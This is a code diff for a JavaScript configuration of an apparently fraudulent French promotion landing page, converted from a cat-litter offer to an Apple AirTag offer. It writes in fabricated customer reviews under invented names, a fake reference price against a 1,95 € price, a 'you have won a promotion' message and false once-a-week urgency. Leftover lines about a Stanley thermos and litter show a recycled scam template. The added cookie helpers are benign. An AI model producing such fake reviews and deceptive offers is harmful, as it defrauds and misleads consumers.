@@ -7,6 +7,8 @@ const baseHref = window.location.protocol + "//" + window.location.host;
 const landingUrl = baseHref + window.location.pathname;
 const imageBase = baseUrl ?? landingUrl;
 
+const siteKey = "airtag-fr";
+
 (function (exp) {
   const countryCode = "fr";
   const lang = "fr-FR";
@@ -25,7 +27,7 @@ const imageBase = baseUrl ?? landingUrl;
     newPrice: "",
     selectText: "",
     coupon: "",
-    timer: "Vous ne pouvez commander qu'un seul paquet au prix promotionnel cette semaine.",
+    timer: "Cette semaine, vous ne pouvez passer une commande au prix promotionnel qu'une seule fois.",
     text: `
   Félicitations!<br><br>
   Vous avez participé à la promotion Stanley : vous avez la chance d'acheter la thermos STANLEY QUENCHER H2.0 avec moule à glace pour seulement <b>37$</b> !
@@ -49,39 +51,39 @@ const imageBase = baseUrl ?? landingUrl;
 
   const reviewsArr = [
     {
-      name: "Sophie R.",
+      name: "Aida",
       time: "Il y a un jour",
       header: "Cette litière est vraiment incroyable.",
       image: "./src/img/review_1.jpg",
-      review: "J'ai deux chats qui lâchent des monstres quand ils vont à la litière, et ils y vont TRES souvent. Après avoir testé bien des litières, celle-ci est vraiment la meilleure possible. Après s'être habitué-e à l'odeur de paille (forcément puisque naturelle et c'est pas plus mal), on est ravi-e. Elle absorbe super bien et surtout masque ABSOLUMENT toutes les odeurs très rapidement, contrairement à toutes les autres que j'ai pu tester (et j'ai fait le tour). Seul bémol, depuis quelques temps maintenant, elle est que très peu disponible sur Amazon car toujours en rupture ou que sais-je. C'est dommage, mais je me rabattrai sur une animalerie qui livre la prochaine fois, c'est pas pratique de devoir sauter dessus quand elle est dispo pour prévoir le stock alors qu'on vient d'en acheter une autre pour compenser.",
+      review: `Il donne bien la localisation des objets auxquels il est associé. On les voit dans l'application "Localiser" de l'iPhone et j'aime beaucoup cela pour ne rien perdre ou même trouver les clés quand je ne les vois pas à la maison.`,
     },
     {
-      name: "Alexandre",
+      name: "DAVID P",
       time: "Il y a deux jours",
       header: "C'est la meilleure litière à ma connaissance.",
       image: "./src/img/review_2.jpg",
-      review: "Absorbe les odeurs, on retire les excréments au fur et à mesure que l'on vide dans les sanitaires. Le reste va dans le compost. 👌",
+      review: "Prix défiant toute concurrence sur amazon pour cet AirTag :-) Bien sûr fonctionnel et très utile",
     },
     {
-      name: "Cozic Raphael",
+      name: "Jacques",
       time: "Il y a deux jours",
       header: "Simplement incroyable.",
       image: "./src/img/review_3.jpg",
-      review: "De loin C’est de loin la meilleure litière végétale qu’il existe , mon chat ne veut pas autre chose , absorbe bien , neutralise les odeurs à condition de débarrasser tout les jours les boules d’urines et les caca . J’aime aussi le fait qu’avec la pelle on peut jeter au toilette , une chasse d’eau et hop tout s’en va . Pas besoin de sac et de stocker dans les poubelles . Vite évacuer .",
+      review: "J'ai récemment acheté trois Apple AirTags, et je suis absolument ravi de cet achat ! 🎉📍 Ces petits appareils sont incroyablement pratiques et faciles à utiliser. Leur configuration a été un jeu d'enfant avec mon iPhone, et ils se sont connectés en quelques secondes. 📱🔗",
     },
     {
-      name: "Hyper Efficace",
+      name: "mikael",
       time: "Il y a quatre jours",
       header: "J'aime ça",
       image: "./src/img/review_4.jpg",
-      review: "Agglomère bien sans faire soupe. Ne colle pas trop au fond contrairement à d'autres types de litière. <br> Transport parfait",
+      review: "Comme tous les produits de la marque, l'AirTag est élégant, facile à utiliser et bien conçu. Son appairage avec l'iPhone est simple et rapide. La précision de localisation est impressionnante grâce à la technologie Ultra Wideband, et l'autonomie de la pile est d'environ un an. Malgré le coût un peu élevé, sa durabilité et son efficacité en font un bon investissement. Attention, il n'est compatible qu'avec l'écosystème Apple et nécessite un accessoire pour le fixer. Idéal pour retrouver clés, sacs ou colliers d'animaux.",
     },
     {
-      name: "Bour Laurent",
+      name: "Renard Laurent",
       time: "Il y a sept jours",
       header: "Wow, j'adore ce produit !",
       image: "./src/img/review_5.jpg",
-      review: "Après avoir essayé de multiples types de litière, celle-ci est celle qui convient le mieux. Prix intéressant sur ce packaging grand modèle de 40L.",
+      review: "Je l’utilise pour protéger mon matériel parce qu’on peut le dissiper pratiquement n’importe où. Ça doit être aussi très pratique pour les gens qui ont des vélos des motos ou des Quad, je vais sûrement en racheter l’autre. Le prix est correct. Le système de suivi GPS fonctionne assez bien même si parfois il est un peu long à se déclencher, je le recommande",
     },
   ];
 
@@ -216,7 +218,7 @@ const imageBase = baseUrl ?? landingUrl;
     steps: cartSteps,
     main: {
       title: "Détails de la commande",
-      oldPrice: "30,66 €",
+      oldPrice: "27,40 €",
       newPrice: "1,95 €",
       size: "Taille",
       subTotal: {
@@ -238,9 +240,9 @@ const imageBase = baseUrl ?? landingUrl;
   const products = [
     {
       id: "26468784",
-      name: "Cat’s Best Original - litière pour chats agglutinante - 40L / 17.2kg",
-      miniImg: "./src/img/slide1.jpg",
-      images: ["./src/img/slide1.jpg"],
+      name: "Apple AirTag",
+      miniImg: "./src/img/price-airtag.png",
+      images: ["./src/img/price-airtag.png"],
     },
   ];
 
@@ -285,6 +287,59 @@ window.addEventListener("load", () => {
     document.head.appendChild(link);
   }
 });
+
+
+function setCookie(name, value, days = 30) {
+  const expires = new Date(Date.now() + days * 864e5).toUTCString();
+  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
+}
+
+function getCookie(name) {
+  var dc = document.cookie;
+  var prefix = (siteKey + name) + "=";
+  var begin = dc.indexOf("; " + prefix);
+  if (begin == -1) {
+    begin = dc.indexOf(prefix);
+    if (begin != 0) return null;
+  }
+  else {
+    begin += 2;
+    var end = document.cookie.indexOf(";", begin);
+    if (end == -1) {
+      end = dc.length;
+    }
+  }
+  return decodeURI(dc.substring(begin + prefix.length, end));
+}
+
+const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));
+
+const clearSiteSpecificCookies = () => {
+  document.cookie.split(';').forEach(cookie => {
+    // Trim any leading spaces from the cookie string
+    const trimmedCookie = cookie.trim();
+
+    // Extract the cookie name
+    const cookieName = trimmedCookie.split('=')[0];
+
+    // Check if the cookie name starts with the siteKey
+    if (cookieName.startsWith(siteKey)) {
+      // Set the cookie's expiration to a past date to delete it
+      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
+    }
+  });
+};
+
+
+const starupCheck = () => {
+  if (getCookie("__firstStart") != null) {
+    return;
+  } else {
+    localStorage.clear();
+    clearSiteSpecificCookies();
+    setCookie("__firstStart", true);
+  }
+};
 
 const lsSelectProduct = (val) =>
   localStorage.setItem("__selected_product", val);
